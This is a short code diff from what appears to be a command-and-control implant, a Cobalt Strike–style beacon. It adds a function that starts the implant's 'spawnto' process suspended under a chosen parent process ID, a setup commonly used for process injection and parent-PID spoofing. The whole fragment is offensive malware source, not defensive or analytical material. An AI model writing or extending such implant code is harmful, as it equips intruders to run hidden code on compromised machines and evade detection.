@@ -1393,3 +1393,11 @@ void SpawnAsUser(char* buffer, int length, BOOL x86)
 cleanup:
 	BeaconDataFree(locals);
 }
+
+BOOL SpawnUnderInternal(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pi, int pid)
+{
+	char cmd[256];
+	SpawnToFix(x86, cmd);
+	return RunUnder(cmd, strlen(cmd), si, pi, CREATE_SUSPENDED, ignoreToken, pid);
+}
+
